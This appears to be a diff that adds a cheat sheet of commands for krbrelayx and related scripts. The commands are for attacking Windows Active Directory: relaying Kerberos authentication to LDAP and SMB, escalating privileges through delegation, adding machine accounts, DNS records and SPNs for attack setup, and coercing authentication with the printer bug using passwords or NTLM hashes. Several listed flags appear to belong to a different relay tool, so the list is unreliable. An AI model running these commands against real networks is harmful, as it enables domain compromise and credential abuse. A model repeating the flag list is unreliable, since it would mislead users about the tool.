@@ -1,0 +1,61 @@
+[X] krbrelayx Command List
+
+[\] python3 krbrelayx.py -h
+[/] Show help menu
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10
+[/] Relay Kerberos authentication to LDAP
+
+[\] python3 krbrelayx.py -t ldaps://192.168.1.10
+[/] Relay to LDAPS (secure LDAP)
+
+[\] python3 krbrelayx.py -t smb://192.168.1.10
+[/] Relay Kerberos authentication to SMB
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --delegate-access
+[/] Configure delegation for privilege escalation
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --escalate-user user
+[/] Escalate privileges for target user
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --create-computer
+[/] Create machine account via relay
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --add-computer NEWPC$
+[/] Add new computer account
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --remove-mic
+[/] Attempt MIC removal (bypass protections)
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --no-smb-server
+[/] Disable SMB server component
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --no-http-server
+[/] Disable HTTP server component
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --interface eth0
+[/] Specify network interface
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --lootdir loot/
+[/] Store captured data in directory
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --debug
+[/] Enable debug output
+
+[\] python3 addspn.py -u user -p password -s HTTP/fakehost.example.local
+[/] Add SPN to account
+
+[\] python3 dnstool.py -u user -p password -a add -r fakehost.example.local -d 192.168.1.100
+[/] Add DNS record for attack setup
+
+[\] python3 printerbug.py domain/user:password@target
+[/] Trigger authentication via printer bug (coerce auth)
+
+[\] python3 printerbug.py domain/user@target -hashes LMHASH:NTHASH
+[/] Use NTLM hashes for authentication coercion
+
+[\] python3 krbrelayx.py -t ldap://192.168.1.10 --krbpass password
+[/] Provide Kerberos password
+
+[\] python3 krbrelayx.py --version
+[/] Show version
